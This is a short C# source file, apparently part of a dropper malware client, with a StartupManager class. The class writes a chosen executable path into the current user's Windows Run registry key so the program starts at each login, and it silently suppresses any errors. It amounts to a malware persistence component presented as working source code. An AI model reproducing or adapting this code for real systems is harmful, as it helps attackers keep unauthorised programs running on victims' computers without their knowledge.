using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace DropperClient.Installation
{
    internal class StartupManager
    {
        public void AddToStartup(string executableName, string executablePath)
        {
            try
            {
                SetRegistryStartup(executableName, executablePath);
            }
            catch
            {
                // Supress
            }
        }

        private void SetRegistryStartup(string executableName, string executablePath)
        {
            var rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue(executableName, executablePath);
        }
    }
}